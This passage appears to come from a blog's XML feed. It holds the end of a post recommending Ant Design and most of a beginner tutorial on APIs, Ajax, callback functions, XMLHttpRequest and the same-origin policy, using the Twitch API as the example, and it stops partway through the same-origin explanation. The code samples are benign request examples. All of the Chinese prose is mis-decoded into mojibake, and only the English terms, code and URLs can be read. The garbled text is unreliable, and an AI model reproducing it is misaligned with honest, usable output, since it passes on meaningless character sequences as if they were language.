å¦‚æœä½ è¦å®¢è£½åŒ–çš„è©±ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œå®˜æ–¹æœ‰æä¾›ä¸€å€‹ less æª”æ¡ˆï¼Œä½ åªè¦æŠŠè£¡é¢ä½ æƒ³æ›çš„è®Šæ•¸æ›æ‰å°±å¥½ï¼Œæˆ–è€…æ˜¯ä½ è‡ªå·± override css ä¹Ÿè¡Œï¼Œå¾ˆè‡ªç”±ã€‚Ant Design ç›®å‰çš„æ›´æ–°é »ç‡æ˜¯æ¯ä¸€é€±éƒ½æœƒä¿®ä¸€äº› bugï¼Œæ¯å€‹æœˆæœƒæœ‰ä¸€äº›æ–°çš„åŠŸèƒ½ï¼Œæˆ‘è¦ºå¾—æ›´æ–°å¾—å¾ˆé »ç¹ä¿®å¾©çš„é€Ÿåº¦ä¹Ÿå¾ˆå¿«ï¼Œæ‡‰è©²æ˜¯æœ‰å€‹ team å°ˆé–€åœ¨è² è²¬é€™å€‹ã€‚
ç¸½ä¹‹å‘¢ï¼Œèª å¿ƒè·Ÿå¤§å®¶æ¨è–¦é€™å¥— Libraryï¼Œä¸‹æ¬¡è¦é–‹ç™¼å¾Œå°ç³»çµ±æ™‚å¯ä»¥è€ƒæ…®çœ‹çœ‹ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>antd</tag>
      </tags>
  </entry>
  <entry>
    <title>è¼•é¬†ç†è§£ Ajax èˆ‡è·¨ä¾†æºè«‹æ±‚</title>
    <url>/2017/05/20/api-ajax-cors-and-jsonp/</url>
    <content><![CDATA[å‰è¨€ä¸€èˆ¬ä¾†èªªåœ¨å­¸ç¿’å¯«ç¶²é çš„æ™‚å€™ï¼Œæœ€å…ˆç¢°åˆ°çš„æœƒæ˜¯ HTML èˆ‡ CSSï¼Œè² è²¬æŠŠç‰ˆé¢åˆ»å‡ºä¾†ä»¥åŠç¾åŒ–ç‰ˆé¢ï¼Œç•¶åŸºç¤æ‰“ç©©ä¹‹å¾Œï¼Œæœƒé–‹å§‹å­¸ç¿’ JavaScriptï¼Œè©¦è‘—åšå‡ºä¸€é»äº’å‹•æ€§çš„æ•ˆæœã€‚è€Œã€Œäº’å‹•ã€é™¤äº†ä½¿ç”¨è€…è·Ÿç€è¦½å™¨çš„äº’å‹•ä»¥å¤–ï¼Œåˆ¥å¿˜äº†é‚„æœ‰ Client ç«¯è·Ÿ Server ç«¯çš„äº’å‹•ï¼Œä¹Ÿå°±æ˜¯å¿…é ˆè¦å­¸æœƒå¾ç€è¦½å™¨ç”¨ JavaScript è·Ÿå¾Œç«¯ Server æ‹¿è³‡æ–™ï¼Œå¦å‰‡ä½ çš„ç¶²é è³‡æ–™éƒ½åªèƒ½æ˜¯å¯«æ­»çš„ã€‚
é€™ç¯‡çš„ä¸»è¦é è¨­è®€è€…æ˜¯ç¶²é å‰ç«¯çš„åˆå­¸è€…ï¼Œå¸Œæœ›èƒ½è®“æœ¬ä¾†ä¸å¤ªç†è§£æ€éº¼è·Ÿ Server äº¤æ›è³‡æ–™æˆ–æ˜¯æ€éº¼ä¸² APi çš„è®€è€…çœ‹å®Œä¹‹å¾Œï¼Œèƒ½å¤ æ›´äº†è§£è©²æ€éº¼è·Ÿå¾Œç«¯ä¸²æ¥ã€‚
å…ˆå¾èˆ‰ä¾‹é–‹å§‹åœ¨é–‹å§‹ä¹‹å‰ï¼Œæˆ‘å€‘å¯ä»¥å…ˆæƒ³æƒ³ä¸€å€‹å•é¡Œï¼š

ç‚ºä»€éº¼å‰ç«¯å¿…é ˆè·Ÿå¾Œç«¯äº¤æ›è³‡æ–™ï¼Ÿ

å…¶å¯¦é€™è·Ÿä½ åšçš„ç¶²é é¡å‹æœ‰é—œï¼Œå‡å¦‚èªªä½ ä»Šå¤©åšçš„æ˜¯ä¸€å€‹å®˜æ–¹ç¶²ç«™ï¼Œå¾ˆå¯èƒ½æ•´å€‹ç¶²ç«™éƒ½æ˜¯éœæ…‹çš„ï¼Œåªè¦ HTML è·Ÿ CSS å°±å¯ä»¥äº†ï¼Œä¸¦ä¸éœ€è¦è·Ÿå¾Œç«¯ Server æ‹¿è³‡æ–™ã€‚
é‚£æˆ‘å€‘å…ˆå‡è¨­ä»Šå¤©è¦åšçš„æ˜¯ä¸€å€‹å¯ä»¥ç€è¦½ç¾åœ¨ Twitch å¯¦æ³åˆ—è¡¨çš„ç¶²é å¥½äº†ï¼Œå¦‚ä¸‹åœ–ã€‚

å¦‚æœé€™å€‹ç¶²é ä¸è·Ÿå¾Œç«¯æ‹¿è³‡æ–™ï¼Œå°±ä»£è¡¨èªªç¶²é çš„å…§å®¹éƒ½æ˜¯å›ºå®šçš„ï¼Œç„¡è«–ä»€éº¼æ™‚å€™çœ‹éƒ½ä¸€æ¨£ã€‚å¯æ˜¯é€™æ¨£çš„è©±å°±ä¸å°äº†å˜›ï¼Œå› ç‚ºé€™å€‹ç¶²é çš„ç›®æ¨™æ˜¯é¡¯ç¤ºå‡ºã€Œç¾åœ¨æœ‰åœ¨é–‹å¯¦æ³çš„é »é“ã€ï¼Œæ‰€ä»¥å…§å®¹æ˜¯æœƒè·Ÿè‘—æ”¹è®Šçš„ã€‚
æ—¢ç„¶æœƒè·Ÿè‘—æ”¹è®Šï¼Œå°±å¿…é ˆä¸æ–·çš„å»æ›´æ–°è³‡æ–™ï¼Œå¾ Server é‚£é‚Šæ‹¿è³‡æ–™å›ä¾†ï¼Œæ¥è‘—åœ¨å‰ç«¯è™•ç†éå¾Œé¡¯ç¤ºã€‚
å·²ç¶“ç¢ºèªæœ‰æ‹¿è³‡æ–™çš„å¿…è¦æ€§ä¹‹å¾Œï¼Œå°±å¯ä»¥å•è‡ªå·±å…©å€‹å•é¡Œï¼š

è¦è·Ÿèª°æ‹¿è³‡æ–™ï¼Ÿ
è¦æ€éº¼æ‹¿è³‡æ–™ï¼Ÿ

ç¬¬ä¸€å€‹å•é¡Œï¼Œå¾ˆæ˜é¡¯çš„å°±æ˜¯è·Ÿ Twitchï¼Œå› ç‚º Twitch æ‰æœ‰ä½ è¦çš„é€™äº›è³‡æ–™å˜›ï¼
é‚£ç¬¬äºŒå€‹å•é¡Œï¼Œè¦æ€éº¼æ‹¿è³‡æ–™å‘¢ï¼Ÿå°±å¿…é ˆé€é Twitch API äº†ã€‚
APIä»€éº¼æ˜¯ APIï¼Ÿä½ å¯èƒ½å·²ç¶“è½éå¾ˆå¤šæ¬¡é€™å€‹åè©ï¼Œä½†é‚„æ˜¯ä¸çŸ¥é“æ˜¯ä»€éº¼ã€‚å…ˆä¾†è¬›è¬›å®ƒçš„å…¨åå§ï¼Œå®ƒçš„å…¨åæ˜¯ã€ŒApplication Programming Interfaceã€ï¼Œä¸­æ–‡ç¿»ä½œæ‡‰ç”¨ç¨‹å¼ä»‹é¢ã€‚
ä½ å¯èƒ½æœƒæƒ³èªªé€™æ˜¯ä»€éº¼é¬¼æ±è¥¿ï¼Œæ€éº¼ä¸­æ–‡è‹±æ–‡æˆ‘éƒ½çœ‹ä¸æ‡‚åœ¨å¹¹å˜›ã€‚ä½†å…¶å¯¦é€™å¹¾å€‹å­—è£¡é¢ï¼Œæœ€é‡è¦çš„æ˜¯ã€Œä»‹é¢ã€å…©å€‹å­—ã€‚
ä»‹é¢æ˜¯ä»€éº¼ï¼Ÿä»‹é¢å°±æ˜¯æ‹¿ä¾†ä¸²æ¥ç”¨çš„ï¼Œæˆ‘èˆ‰ä¸€å€‹ä¾‹å­ä½ å°±çŸ¥é“äº†ã€‚
é›»è…¦ä¸Šä¸æ˜¯æœ‰ä¸€å€‹ USB æ’æ§½å—ï¼Ÿç„¶å¾Œä½ åªè¦æ˜¯çœ‹åˆ°å¸‚é¢ä¸Šæœ‰è³£ USB éš¨èº«ç¢Ÿçš„ï¼Œéƒ½å¯ä»¥è²·ä¾†ä»¥å¾Œæ’åˆ° USB æ’æ§½ï¼Œä½ çš„é›»è…¦å°±å¯ä»¥è®€å–å¾—åˆ°ã€‚ä½ æœ‰æƒ³éç‚ºä»€éº¼å—ï¼Ÿæ˜æ˜å°±æ˜¯ä¸åŒå» å•†åšçš„æ±è¥¿ï¼Œå¯æ˜¯å»éƒ½å¯ä»¥è®€å¾—åˆ°ã€éƒ½å¯ä»¥æ’åˆ° USB æ’æ§½è£¡é¢ã€‚
å› ç‚ºæœ‰ä¸€é …æ¨™æº–å«åš USB ä»‹é¢ï¼Œç•¶é€™å¥—æ¨™æº–è¨‚å‡ºä¾†ä»¥å¾Œï¼Œæ‰€æœ‰å» å•†åªè¦æŒ‰ç…§é€™ä¸€å¥—æ¨™æº–ä¾†é–‹ç™¼ï¼Œå°±å¯ä»¥ä¿è­‰èƒ½å¤ é€£æ¥é›»è…¦è·Ÿ USB éš¨èº«ç¢Ÿã€‚
API ä¹Ÿæ˜¯é€™æ¨£ï¼Œåªæ˜¯è®Šæˆç¨‹å¼è·Ÿç¨‹å¼ä¹‹é–“çš„ä¸²æ¥ã€‚ä¾‹å¦‚èªªä»Šå¤©æˆ‘å¯«ç¨‹å¼éœ€è¦è®€å–æª”æ¡ˆå¥½äº†ï¼Œæˆ‘è¦æ€éº¼è®€å–æª”æ¡ˆï¼Ÿè®€å–æª”æ¡ˆæ˜¯ä½œæ¥­ç³»çµ±æä¾›çš„åŠŸèƒ½ï¼Œå› æ­¤æˆ‘å¯ä»¥å»ä¸²æ¥ã€Œè®€å–æª”æ¡ˆçš„ APIã€ï¼Œå°±å¯ä»¥åœ¨æˆ‘çš„ç¨‹å¼è£¡é¢ä¹Ÿä½¿ç”¨é€™å€‹åŠŸèƒ½äº†ã€‚
å†å¤šèˆ‰å¹¾å€‹ä¾‹å­ä½ å¯èƒ½æœƒæ›´æœ‰æ„Ÿè¦ºã€‚
ä¾‹å¦‚èªªä»Šå¤©æˆ‘æƒ³è¦è®“æˆ‘çš„ç¶²é èƒ½å¤ ç”¨ Facebook ç™»å…¥ï¼Œé‚£è¦æ€éº¼è¾¦ï¼Ÿæˆ‘å°±è¦å»ä¸²æ¥ã€ŒFacebook æä¾›çš„ APIã€ï¼Œå°±ç­‰æ–¼èªªæ˜¯ Facebook å‘å¤–æä¾›çµ¦å¤§å®¶çš„ä¸€å¥—ä»‹é¢ã€ä¸€å¥—æ¨™æº–ï¼Œä»»ä½•æƒ³è¦æ¥å…¥ Facebook æœå‹™çš„é–‹ç™¼è€…å€‘ï¼Œéƒ½å¯ä»¥éµå¾ªè‘—é‚£å¥—è¦ç¯„æ‹¿åˆ°è‡ªå·±æƒ³è¦çš„è³‡æ–™ï¼Œé€™å€‹æ±è¥¿å°±å«åš APIã€‚
æˆ–æ˜¯ä½ å¯èƒ½ä»Šå¤©æ˜¯ä¸€å€‹é£¯åº—ç®¡ç†ç³»çµ±çš„é–‹ç™¼è€…ï¼Œä½ å€‘å…¬å¸åšäº†ä¸€å¥—çµ¦é£¯åº—ç”¨çš„ ERPï¼Œå¯ä»¥ç®¡ç†é£¯åº—çš„è¨‚æˆ¿ç‹€æ…‹ç­‰ç­‰ï¼Œå°±èƒ½çŸ¥é“èªªç¾åœ¨æœ‰å“ªäº›æˆ¿é–“æ˜¯ç©ºçš„ã€‚
è€Œé€™äº›è³‡æ–™å¦‚æœåªæœ‰è‡ªå·±ç”¨å¤ªå¯æƒœäº†ï¼Œæ–¼æ˜¯å…¬å¸æ±ºå®šæŠŠé€™äº›è³‡æ–™æä¾›çµ¦å¤§å‹è¨‚æˆ¿ç¶²ç«™ï¼Œåœ¨é‚£äº›ç¶²ç«™ä¸Šèƒ½å¤ å³æ™‚é¡¯ç¤ºé€™é–“é£¯åº—çš„æˆ¿é–“ç‹€æ³ã€‚æ‰€ä»¥å°±å¿…é ˆäº¤æ›è³‡æ–™ï¼Œä½ è¦æä¾›ä¸€å€‹ã€ŒæŸ¥è©¢æˆ¿é–“æƒ…å½¢çš„ APIã€çµ¦å…¶ä»–ç¶²ç«™ï¼Œè®“ä»–å€‘èƒ½å¤ å»ä¸²æ¥ï¼Œæ‰èƒ½ç²å¾—é€™äº›è³‡è¨Šã€‚
è¬›åˆ°é€™é‚Šï¼Œå¤§å®¶æ‡‰è©²å° API å·²ç¶“æœ‰ä¸€äº› sense äº†ï¼Œæˆ‘å†å¤šèˆ‰å¹¾å€‹ä¾‹å­ï¼š

æˆ‘æƒ³è¦æŠ“åˆ° flickr ä¸Šé¢çš„ç…§ç‰‡ï¼Œæ‰€ä»¥æˆ‘è¦å»ä¸²æ¥ flickr çš„ API
Google è¦é–‹æ”¾è®“å…¶ä»– App ä¹Ÿèƒ½ç”¨ Google ç™»å…¥é©—è­‰ï¼Œæ‰€ä»¥ Google è¦æä¾›ã€ŒGoogle ç™»å…¥ APIã€
æˆ‘è¦æŠ“ Twitch ä¸Šé¢ç¾åœ¨æœ‰å“ªäº›é »é“ï¼Œæ‰€ä»¥è¦ä¸² Twitch API

API Documentationæ—¢ç„¶å·²ç¶“çŸ¥é“ API æ˜¯ä»€éº¼äº†ï¼Œä¹ŸçŸ¥é“è¦ä¸²æ¥ APIï¼Œé‚£ä¸‹ä¸€å€‹å•é¡Œå°±æ˜¯ã€Œé‚£è¦æ€éº¼ä¸²å‘¢ï¼Ÿã€
å‰›å‰›å‰é¢æœ‰æéæª”æ¡ˆå­˜å–çš„ä¾‹å­ï¼Œå…¶å¯¦é€™å€‹æ¯”è¼ƒåƒæ˜¯å‘¼å«ä½œæ¥­ç³»çµ±æˆ–æ˜¯ç¨‹å¼èªè¨€çš„å‡½å¼åº«æä¾›çš„ Functionï¼Œè€Œé€™äº› Function ä½ é€šå¸¸éƒ½å¯ä»¥åœ¨å®˜æ–¹æ–‡ä»¶ä¸ŠæŸ¥åˆ°æ›´è©³ç´°çš„èªªæ˜ï¼Œä¾‹å¦‚èªª Node.js çš„è®€å–æª”æ¡ˆï¼š

ï¼ˆä¾†æºï¼šhttps://nodejs.org/api/fs.html#fs_fs_readdir_path_options_callbackï¼‰
ä¸Šé¢å°±æœ‰å¯«èªªä½ æ‡‰è©²å‘¼å«å“ªä¸€å€‹ Functionï¼Œæ‡‰è©²å‚³å…¥å“ªäº›åƒæ•¸ã€‚
API çš„ä¸²æ¥ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œä¸€å®šè¦æœ‰æ–‡ä»¶ä½ æ‰çŸ¥é“æ€éº¼ä¸²ï¼Œä¸ç„¶æ ¹æœ¬ä¸²ä¸èµ·ä¾†ï¼Œå› ç‚ºä½ é€£è¦å‚³ä»€éº¼åƒæ•¸éƒ½ä¸çŸ¥é“ã€‚
æˆ‘å€‘å¯ä»¥å…ˆä¾†çœ‹çœ‹Twitch API æ–‡ä»¶æ˜¯æ€éº¼å¯«çš„ã€‚
è£¡é¢èªªæ˜äº†ä½ å¿…é ˆè¦æœ‰ä¸€å€‹Client IDï¼Œç„¶å¾Œ API Root çš„ URL æ˜¯ https://api.twitch.tv/kraken ç­‰ç­‰ï¼Œé€™äº›éƒ½æ˜¯èˆ‡ API ç›¸é—œçš„åŸºæœ¬è³‡è¨Šã€‚å¦‚æœä½ åœ¨å·¦å´æ¬„éš¨ä¾¿é»ä¸€å€‹ APIï¼Œæœƒçœ‹åˆ°å€‹åˆ¥ API çš„è©³ç´°è³‡è¨Šï¼š

é€™é‚Šå°±æœ‰å¯«èªªç¶²å€æ˜¯ä»€éº¼ï¼Œä½ æ‡‰è©²å‚³çš„åƒæ•¸æ˜¯ä»€éº¼ç­‰ç­‰ï¼Œä¸‹é¢é‚„æœ‰é™„ä¸Šåƒè€ƒç¯„ä¾‹ï¼Œé€™å°±æ˜¯ä¸€å€‹å¾ˆå®Œæ•´çš„ API æ–‡ä»¶ã€‚
é€šå¸¸åœ¨å¯«ç¶²é çš„æ™‚å€™ï¼Œæˆ‘å€‘éƒ½æœƒç›´æ¥è¬› APIï¼Œä½†å…¶å¯¦æˆ‘å€‘æŒ‡çš„æ˜¯ Web APIï¼Œä¹Ÿå°±æ˜¯é€éç¶²è·¯ä¾†å‚³è¼¸çš„ APIã€‚é‚£æœ‰æ²’æœ‰é Web API å‘¢ï¼Ÿæœ‰ï¼Œåƒæˆ‘å€‘å‰é¢æåˆ°çš„è·Ÿä½œæ¥­ç³»çµ±è¦è®€æª”çš„ APIï¼Œå°±éƒ½æ˜¯åœ¨æœ¬æ©Ÿåº•ä¸‹åŸ·è¡Œçš„ï¼Œæ²’æœ‰é€éä»»ä½•ç¶²è·¯ã€‚
ä¸éé€™å…¶å¯¦ä¹Ÿä¸ç”¨å¤ªåœ¨æ„ï¼Œåæ­£å¤§å®¶éƒ½ç¿’æ…£è¬› APIï¼Œè½å¾—æ‡‚å°±å¥½ã€‚
ç¾åœ¨æœ‰äº† API æ–‡ä»¶ï¼Œæˆ‘å€‘å°±æœ‰äº†æ‰€æœ‰æˆ‘å€‘éœ€è¦çš„è³‡è¨Šã€‚ä»¥ä¸Šé¢é€™å€‹ Twitch çš„ä¾‹å­ä¾†è¬›ï¼Œæˆ‘å€‘åªè¦èƒ½å¤ ç™¼é€ Request åˆ°https://api.twitch.tv/kraken/games/top?client_id=xxxï¼ŒTwitch å°±æœƒå‚³å›ç›®å‰æœ€ç†±é–€çš„éŠæˆ²åˆ—è¡¨ã€‚
æˆ‘å€‘å·²ç¶“æŠŠå•é¡Œçš„ç¯„åœä¸€æ­¥æ­¥çµ¦ç¸®å°äº†ï¼Œä¸€é–‹å§‹æ˜¯ã€Œè¦æ€éº¼è·Ÿ Twitch æ‹¿è³‡æ–™ã€ï¼Œç¾åœ¨å‰‡æ›´ç´°çš„åˆ‡åˆ†ç‚ºï¼šã€Œè¦æ€éº¼åˆ©ç”¨ JavaScript ç™¼é€ Reuqestã€
Ajaxè¦åœ¨ç€è¦½å™¨ä¸Šé¢ç™¼é€ Requestï¼Œå¿…é ˆæ‡‰ç”¨åˆ°ä¸€ç¨®æŠ€è¡“å«åš Ajaxï¼Œå…¨åæ˜¯ã€ŒAsynchronous JavaScript and XMLã€ï¼Œé‡é»åœ¨æ–¼Asynchronousé€™å€‹å–®å­—ï¼ŒéåŒæ­¥ã€‚
åœ¨è¬›ä»€éº¼æ˜¯éåŒæ­¥ä¹‹å‰ï¼Œå°±è¦å…ˆä¾†æä¸€ä¸‹ä»€éº¼æ˜¯åŒæ­¥ã€‚ä½ åŸæœ¬å¯«çš„ JavaScript å°±å¹¾ä¹éƒ½æ˜¯åŒæ­¥åŸ·è¡Œçš„ã€‚æ„æ€æ˜¯ä»–åŸ·è¡Œåˆ°æŸä¸€è¡Œçš„æ™‚å€™ï¼Œæœƒç­‰é€™è¡ŒåŸ·è¡Œå®Œç•¢ï¼Œæ‰åŸ·è¡Œåˆ°ä¸‹ä¸€è¡Œï¼Œç¢ºä¿åŸ·è¡Œé †åºã€‚
ä¹Ÿå°±æ˜¯èªªä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ï¼Œæœ€å¾Œä¸€è¡Œéœ€è¦ç­‰å¾ˆé•·ä¸€æ®µæ™‚é–“æ‰èƒ½åŸ·è¡Œåˆ°ï¼š
var count = 10000000;while(count--) &#123;  // åšä¸€äº›è€—æ™‚çš„æ“ä½œ&#125;  // ç­‰å¾ˆä¹…æ‰è¢«åŸ·è¡Œåˆ°console.log(&#x27;done&#x27;)

çœ‹èµ·ä¾†æ»¿æœ‰é“ç†çš„ï¼Œç¨‹å¼æœ¬ä¾†ä¸å°±æ˜¯ä¸€è¡Œä¸€è¡ŒåŸ·è¡Œçš„å—ï¼Ÿå¯æ˜¯å¦‚æœä»Šå¤©ç‰½æ¶‰åˆ°ç¶²è·¯æ“ä½œçš„è©±ï¼Œå¤§å®¶å¯ä»¥æ€è€ƒçœ‹çœ‹ä¸‹é¢é€™å€‹ä¾‹å­ï¼š
// å‡è¨­æœ‰å€‹ç™¼é€ Request çš„å‡½å¼å«åš sendRequestvar result = sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;);  // ç­‰å¾ˆä¹…æ‰è¢«åŸ·è¡Œåˆ°console.log(result);

ç•¶ JavaScript åŸ·è¡Œåˆ°sendRequestçš„æ™‚å€™ï¼Œç”±æ–¼æ˜¯åŒæ­¥çš„ï¼Œå°±æœƒç­‰å¾… Response å›ä¾†æ‰ç¹¼çºŒåšäº‹ã€‚æ›å¥è©±èªªï¼Œåœ¨ Response é‚„æ²’å›ä¾†ä¹‹å‰ï¼Œæ•´å€‹ JavaScript å¼•æ“æ˜¯ä¸æœƒåŸ·è¡Œä»»ä½•æ±è¥¿çš„ï¼å¾ˆå¯æ€•å°å§ï¼Œä½ é»ä»»ä½•æœ‰ç‰½æ¶‰åˆ° JavaScript çš„æ±è¥¿ï¼Œéƒ½ä¸æœƒæœ‰åæ‡‰ï¼Œå› ç‚º JavaScript é‚„åœ¨ç­‰ Response å›ä¾†ã€‚
æ‰€ä»¥å‘¢ï¼Œåƒæ˜¯é€™ç¨®å·²ç¶“é æœŸåˆ°å¯èƒ½éå¸¸è€—æ™‚é–“ï¼Œéå¸¸ä¸ç©©å®šçš„æ“ä½œï¼Œå°±ä¸èƒ½ç”¨åŒæ­¥çš„æ–¹å¼ä¾†åŸ·è¡Œï¼Œè€Œæ˜¯è¦ç”¨éåŒæ­¥ã€‚
éåŒæ­¥æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿå°±æ˜¯åŸ·è¡Œå®Œä¹‹å¾Œå°±ä¸ç®¡å®ƒäº†ï¼Œä¸ç­‰çµæœå›ä¾†å°±ç¹¼çºŒåŸ·è¡Œä¸‹ä¸€è¡Œï¼š
// å‡è¨­æœ‰å€‹ç™¼é€ Request çš„å‡½å¼å«åš sendRequestvar result = sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;);  // ä¸Šé¢ Request ç™¼é€å®Œä¹‹å¾Œå°±åŸ·è¡Œåˆ°é€™ä¸€è¡Œï¼Œæ‰€ä»¥ result ä¸æœƒæœ‰æ±è¥¿// å› ç‚º Response æ ¹æœ¬æ²’æœ‰å›ä¾†console.log(result);

é€™é‚Šéœ€è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ã€ŒéåŒæ­¥çš„ Function ä¸èƒ½ç›´æ¥é€é return æŠŠçµæœå‚³å›ä¾†ã€ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºåƒä¸Šé¢é€™å€‹ä¾‹å­ï¼Œå®ƒç™¼é€ Request ä¹‹å¾Œå°±æœƒåŸ·è¡Œåˆ°ä¸‹ä¸€è¡Œäº†ï¼Œé€™å€‹æ™‚å€™æ ¹æœ¬å°±é‚„æ²’æœ‰ Responseï¼Œæ˜¯è¦å›å‚³ä»€éº¼ï¼Ÿ
é‚£æ€éº¼è¾¦å‘¢ï¼Ÿå…ˆè½æˆ‘èˆ‰å€‹å¾ˆå¸¸è¦‹çš„å°ä¾‹å­å§ï¼
æˆ‘ä¹‹å‰åœ¨æ–°åŠ å¡çš„ Food Court åƒé£¯çš„æ™‚å€™ï¼Œé‚£é‚Šæ¯ä¸€å¼µæ¡Œå­ä¸Šé¢éƒ½æœƒæœ‰æ¡Œè™Ÿã€‚ä½ å»é»é¤çš„æ™‚å€™ï¼Œåªè¦è·Ÿè€é—†è¬›èªªä½ åå“ªä¸€æ¡Œï¼Œç­‰é¤é»å®Œæˆä¹‹å¾Œè€é—†å°±æœƒè‡ªå·±ä¸»å‹•é€éä¾†ã€‚
æ‰€ä»¥æˆ‘ä¸éœ€è¦ç«™åœ¨åº—å®¶é–€å£ç­‰ï¼Œæˆ‘åªè¦åœ¨ä½å­ä¸Šç¹¼çºŒåæˆ‘çš„äº‹æƒ…ï¼Œåæ­£é¤é»å¥½äº†ä¹‹å¾Œè€é—†æœƒé€éä¾†ã€‚
éåŒæ­¥çš„æ¦‚å¿µä¹Ÿæ˜¯é€™æ¨£ï¼Œæˆ‘ç™¼é€ Request ä¹‹å¾Œï¼ˆæˆ‘é»é¤ä¹‹å¾Œï¼‰ï¼Œæˆ‘ä¸ç”¨ç­‰ Response å›ä¾†ï¼ˆä¸ç”¨ç­‰è€é—†åšå¥½ï¼‰ï¼Œå¯ä»¥ç¹¼çºŒåšè‡ªå·±çš„äº‹ï¼Œç­‰ Response å›ä¾†ä¹‹å¾Œï¼ˆç­‰é¤é»åšå¥½ä¹‹å¾Œï¼‰ï¼Œæœƒè‡ªå·±å¹«æˆ‘æŠŠçµæœé€éä¾†ï¼ˆè€é—†æœƒè‡ªå·±é€éä¾†ï¼‰ã€‚
åœ¨é»é¤çš„ä¾‹å­ä¸­ï¼Œè€é—†å¯ä»¥é€éæ¡Œè™ŸçŸ¥é“æ‡‰è©²æŠŠè³‡æ–™é€åˆ°å“ªé‚Šï¼Œé‚£åœ¨ JavaScript è£¡é¢å‘¢ï¼Ÿå¯ä»¥é€é Functionï¼è€Œé€™å€‹ Functionï¼Œæˆ‘å€‘å°±ç¨±ä½œ Callback Functionï¼Œå›å‘¼å‡½å¼ã€‚
ç•¶éåŒæ­¥çš„æ“ä½œå®Œæˆæ™‚ï¼Œå°±å¯ä»¥å‘¼å«é€™å€‹ Functionï¼Œä¸¦ä¸”æŠŠè³‡æ–™å¸¶é€²ä¾†ã€‚
// å‡è¨­æœ‰å€‹ç™¼é€ Request çš„å‡½å¼å«åš sendRequestsendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;, callMe);  function callMe (response) &#123;  console.log(response);&#125;  // æˆ–è€…å¯«æˆåŒ¿åå‡½å¼sendRequest(&#x27;https://api.twitch.tv/kraken/games/top?client_id=xxx&#x27;, function (response) &#123;  console.log(response);&#125;);

ç¾åœ¨ä½ å°±çŸ¥é“ç‚ºä»€éº¼ç¶²è·¯çš„æ“ä½œæ˜¯éåŒæ­¥ï¼Œä»¥åŠä»€éº¼æ˜¯ callback function äº†ã€‚
XMLHttpRequestæ–¹æ‰æåˆ° Ajaxã€éåŒæ­¥ä»¥åŠ callback function çš„æ¦‚å¿µï¼Œä½†é‚„æ˜¯æ²’è¬›åˆ°è¦æ€éº¼ç™¼é€ Requestï¼Œåªå¯«äº†ä¸€å€‹å‡çš„sendRequestå‡½å¼ç•¶ä½œåƒè€ƒè€Œå·²ã€‚
è¦ç™¼é€ Request çš„è©±ï¼Œå°±è¦é€éç€è¦½å™¨å¹«æˆ‘å€‘æº–å‚™å¥½çš„ä¸€å€‹ç‰©ä»¶ï¼Œå«åšXMLHttpRequestï¼Œç¯„ä¾‹ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
var request = new XMLHttpRequest();request.open(&#x27;GET&#x27;, `https://api.twitch.tv/kraken/games/top?client_id=xxx`, true);request.onload = function() &#123;  if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) &#123;      // Success!    console.log(request.responseText);  &#125;&#125;;request.send();

ä¸Šé¢çš„request.onloadå…¶å¯¦å°±æ˜¯åœ¨æŒ‡å®šèªªç•¶è³‡æ–™å›ä¾†çš„æ™‚å€™ï¼Œè¦ç”¨å“ªä¸€å€‹ function å»è™•ç†ã€‚
æœ‰äº†ä¸Šé¢é€™ä¸€æ®µç¨‹å¼ç¢¼ä¹‹å¾Œï¼Œä½ çµ‚æ–¼å¤§åŠŸå‘Šæˆï¼Œçµ‚æ–¼å¯ä»¥ä¸²æ¥ Twitch APIï¼Œå¾é‚£é‚Šæ‹¿è³‡æ–™ä¸‹ä¾†äº†ï¼çœŸæ˜¯å¯å–œå¯è³€ï¼Œå¾æ­¤ä¹‹å¾Œï¼Œä½ å°±è·Ÿã€Œä¸²æ¥ APIã€é€™å€‹æŠ€èƒ½éè‘—å¹¸ç¦å¿«æ¨‚çš„ç”Ÿæ´»â€¦
æ‰æ€ªã€‚
Same Origin Policyæ­£ç•¶ä½ ä»¥ç‚ºè‡ªå·±å·²ç¶“å°ä¸²æ¥ API é§•è¼•å°±ç†Ÿï¼Œæƒ³èªªå»ä¸²æ¥åˆ¥çš„ API è©¦è©¦çœ‹å¥½äº†çš„æ™‚å€™ï¼Œæ‰ç™¼ç¾ä¸€ä¸²å°±å‡ºå•é¡Œäº†ï¼š

XMLHttpRequest cannot load http://odata.tn.edu.tw/ebookapi/api/getOdataJH/?level=all. No &#x27;Access-Control-Allow-Origin&#x27; header is present on the requested resource. Origin &#x27;null&#x27; is therefore not allowed access.

å’¦ï¼Ÿç‚ºä»€éº¼æœƒæœ‰é€™å€‹éŒ¯èª¤å‘¢ï¼Ÿ
å…¶å¯¦æ˜¯ç€è¦½å™¨å› ç‚ºå®‰å…¨æ€§çš„è€ƒé‡ï¼Œæœ‰ä¸€å€‹æ±è¥¿å«åšåŒæºæ”¿ç­–ï¼ŒSame-origin policyã€‚
æ„æ€å°±æ˜¯èªªå¦‚æœä½ ç¾åœ¨é€™å€‹ç¶²ç«™çš„è·Ÿä½ è¦å‘¼å«çš„ API çš„ç¶²ç«™ã€Œä¸åŒæºã€çš„æ™‚å€™ï¼Œç€è¦½å™¨ä¸€æ¨£æœƒå¹«ä½ ç™¼ Requestï¼Œä½†æ˜¯æœƒæŠŠ Response çµ¦æ“‹ä¸‹ä¾†ï¼Œä¸è®“ä½ çš„ JavaScript æ‹¿åˆ°ä¸¦ä¸”å‚³å›éŒ¯èª¤ã€‚
